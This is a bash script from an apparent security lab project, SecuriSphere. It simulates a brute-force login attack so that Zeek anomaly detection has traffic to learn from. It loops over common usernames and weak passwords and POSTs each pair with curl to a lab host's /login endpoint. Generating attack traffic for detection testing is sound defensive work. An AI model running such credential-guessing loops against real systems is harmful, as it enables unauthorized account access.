#!/bin/bash
# =============================================================================
# SecuriSphere - Brute Force Attack Simulation
# Generates traffic for Zeek baseline anomaly detection
# =============================================================================

VICTIM_HOST="victim"
VICTIM_PORT="8000"

echo "============================================="
echo "SecuriSphere - Brute Force Attack Simulation"
echo "============================================="
echo ""

# Common weak passwords to try
PASSWORDS=(
    "password"
    "123456"
    "admin"
    "admin123"
    "root"
    "guest"
    "letmein"
    "password123"
    "qwerty"
    "12345678"
)

USERS=(
    "admin"
    "root"
    "user"
    "test"
    "guest"
    "john_doe"
    "jane_smith"
)

echo "[*] Starting brute force simulation..."
echo "[*] This will help generate anomalous traffic patterns"
echo ""

for user in "${USERS[@]}"; do
    echo "[*] Targeting user: $user"
    for pass in "${PASSWORDS[@]}"; do
        echo "  -> Trying $user:$pass"
        curl -s -X POST http://$VICTIM_HOST:$VICTIM_PORT/login \
            -H "Content-Type: application/json" \
            -d "{\"username\":\"$user\",\"password\":\"$pass\"}" > /dev/null
        
        # Small delay to avoid overwhelming
        sleep 0.1
    done
    echo ""
done

echo "[*] Brute force simulation complete!"
echo "[*] Check Zeek logs for anomaly patterns"
